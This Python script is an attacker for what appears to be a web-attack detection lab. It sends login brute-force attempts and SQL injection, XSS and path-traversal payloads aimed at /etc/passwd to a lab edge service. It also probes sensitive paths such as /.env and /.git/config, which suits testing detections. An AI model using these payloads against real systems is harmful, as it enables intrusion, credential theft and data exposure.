#!/usr/bin/env python3
"""Attacker for the SentinelShop detection lab: one flag per attack.

Usage: attack.py --bruteforce | --sqli | --xss | --traversal | --scan404 | --all
       attack.py --serve    (probe server: GET :9000/probe?path=/api/products)
"""
import argparse
import http.client
import json
import os
import time
import urllib.parse
from collections import Counter
from http.server import BaseHTTPRequestHandler, HTTPServer

EDGE = urllib.parse.urlparse(os.environ.get("EDGE_URL", "http://edge:8080"))


def request(method, path, body=None):
    conn = http.client.HTTPConnection(EDGE.hostname, EDGE.port, timeout=5)
    headers = {"Content-Type": "application/json"} if body else {}
    try:
        conn.request(method, path, body=body, headers=headers)
        return conn.getresponse().status
    except OSError:
        return 0
    finally:
        conn.close()


def get_all(paths, delay):
    seen = Counter()
    for path in paths:
        seen[request("GET", path)] += 1
        time.sleep(delay)
    return dict(seen)


def bruteforce():
    seen = Counter()
    for i in range(30):
        body = json.dumps({"username": "alice", "password": f"wrong-{i}"})
        seen[request("POST", "/api/login", body)] += 1
        time.sleep(0.65)
    return dict(seen)


def sqli():
    return get_all([
        "/api/search?q=%27%20OR%201%3D1--",
        "/api/search?q=1%20UNION%20SELECT%20username,password%20FROM%20users--",
        "/api/products/1%27%20OR%20%271%27%3D%271",
        "/api/search?q=1;SELECT%20sleep(5)--",
        "/api/products/1%20UNION%20SELECT%20null--",
    ], 0.4)


def xss():
    return get_all([
        "/api/search?q=%3Cscript%3Ealert(1)%3C/script%3E",
        "/api/search?q=%22%3E%3Cimg%20src=x%20onerror=alert(1)%3E",
        "/api/products/%3Cscript%3Ealert(1)%3C/script%3E",
        "/api/search?q=javascript:alert(document.cookie)",
    ], 0.4)


def traversal():
    return get_all([
        "/api/products/../../etc/passwd",
        "/api/products/%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "/api/search?q=../../../etc/passwd",
        "/api/products/..%2f..%2f..%2fetc/passwd",
    ], 0.4)


def scan404():
    known = ["/admin", "/wp-login.php", "/.env", "/.git/config", "/phpmyadmin",
             "/api/admin", "/backup.zip", "/config.php", "/server-status", "/console"]
    paths = known + [f"/api/missing-{i}" for i in range(30)]
    return get_all(paths, 0.35)


ATTACKS = {"bruteforce": bruteforce, "sqli": sqli, "xss": xss,
           "traversal": traversal, "scan404": scan404}


class Probe(BaseHTTPRequestHandler):
    """One request to the edge made FROM this container's IP."""

    def do_GET(self):
        query = urllib.parse.parse_qs(urllib.parse.urlparse(self.path).query)
        status = request("GET", query.get("path", ["/api/products"])[0])
        payload = json.dumps({"status": status}).encode()
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.end_headers()
        self.wfile.write(payload)

    def log_message(self, *args):
        pass


def main():
    parser = argparse.ArgumentParser(description=__doc__)
    for name in ATTACKS:
        parser.add_argument(f"--{name}", action="store_true")
    parser.add_argument("--all", action="store_true")
    parser.add_argument("--serve", action="store_true")
    args = parser.parse_args()
    if args.serve:
        HTTPServer(("0.0.0.0", 9000), Probe).serve_forever()
        return
    chosen = [n for n in ATTACKS if args.all or getattr(args, n)]
    if not chosen:
        parser.error("pick an attack flag or --all")
    for name in chosen:
        print(f"{name}: statuses {ATTACKS[name]()}", flush=True)


if __name__ == "__main__":
    main()
